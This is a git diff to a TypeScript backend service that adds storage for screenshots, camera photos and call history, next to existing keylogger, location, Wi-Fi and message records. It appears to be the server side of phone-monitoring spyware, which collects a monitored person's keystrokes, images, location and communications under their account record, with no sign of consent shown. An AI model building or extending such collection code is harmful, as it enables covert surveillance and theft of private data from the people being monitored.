@@ -1,6 +1,8 @@
 import * as bcrypt from "bcrypt";
 import { Service } from "typedi";
 import { OrmRepository } from "typeorm-typedi-extensions";
+import fs from "fs";
+import uuidv4 from "uuid";
 
 import {
     EventDispatcher,
@@ -13,9 +15,12 @@ import { events } from "../subscribers/events";
 import { DeleteResult } from "typeorm";
 import { Wifi } from "../models/Wifi";
 import { Message } from "../models/Message";
-import { Coordinates } from '../models/Coordinates';
+import { Coordinates } from "../models/Coordinates";
 import { TimeOnApp } from "../models/TimeOnApp";
-import { KeyLogger } from '../models/KeyLogger';
+import { KeyLogger } from "../models/KeyLogger";
+import { ScreenShot } from "../models/ScreenShot";
+import { Photo } from "../models/Photo";
+import { CallHistory } from '../models/CallHistory';
 
 @Service()
 export class UserService {
@@ -67,7 +72,6 @@ export class UserService {
         email: string,
         password: string
     ): Promise<User | undefined> {
-        console.log(email, password);
         const user = await this.userRepository.findOne({ email });
 
         if (user) {
@@ -93,12 +97,82 @@ export class UserService {
         return user;
     }
 
-    public async addCoordinates(coordinatesList: Coordinates[], user: User): Promise<User> {
+    public async addCoordinates(
+        coordinate: Coordinates,
+        user: User
+    ): Promise<User> {
         if (user.coordinatesList === undefined) {
             user.coordinatesList = [];
         }
 
-        user.coordinatesList.push(...coordinatesList);
+        user.coordinatesList.push(coordinate);
+
+        await this.userRepository.save(user);
+
+        return user;
+    }
+
+    public async addScreenShoot(
+        screenShot: ScreenShot,
+        user: User
+    ): Promise<User> {
+        if (user.screenShotList === undefined) {
+            user.screenShotList = [];
+        }
+
+        const fileName = uuidv4();
+
+        const buff = new Buffer(screenShot.screenShot, "base64");
+
+        try {
+            fs.mkdirSync("media/screenshots", { recursive: true });
+        } catch (err) {
+            if (err.code !== "EEXIST") {
+                throw err;
+            }
+        }
+
+        const filePath = `media/screenshots/${fileName}.jpeg`;
+
+        fs.writeFileSync(filePath, buff);
+
+        screenShot.path = filePath;
+
+        screenShot.screenShot = "uploaded"; // avoid resending base64 string
+
+        user.screenShotList.push(screenShot);
+
+        await this.userRepository.save(user);
+
+        return user;
+    }
+
+    public async addPhoto(photo: Photo, user: User): Promise<User> {
+        if (user.photoList === undefined) {
+            user.photoList = [];
+        }
+
+        const fileName = uuidv4();
+
+        const buff = new Buffer(photo.img, "base64");
+
+        try {
+            fs.mkdirSync("media/photos", { recursive: true });
+        } catch (err) {
+            if (err.code !== "EEXIST") {
+                throw err;
+            }
+        }
+
+        const filePath = `media/photos/${fileName}.jpeg`;
+
+        fs.writeFileSync(filePath, buff);
+
+        photo.path = filePath;
+
+        photo.img = "uploaded"; // avoid resending base64 string
+
+        user.photoList.push(photo);
 
         await this.userRepository.save(user);
 
@@ -114,6 +188,18 @@ export class UserService {
         }
 
         user.messageList.push(...messageList);
+
+        await this.userRepository.save(user);
+
+        return user;
+    }
+
+    public async addCallHistory(callHistoryList: CallHistory[], user: User): Promise<User> {
+        if (user.callHistoryList === undefined) {
+            user.callHistoryList = [];
+        }
+
+        user.callHistoryList.push(...callHistoryList);
 
         await this.userRepository.save(user);
 
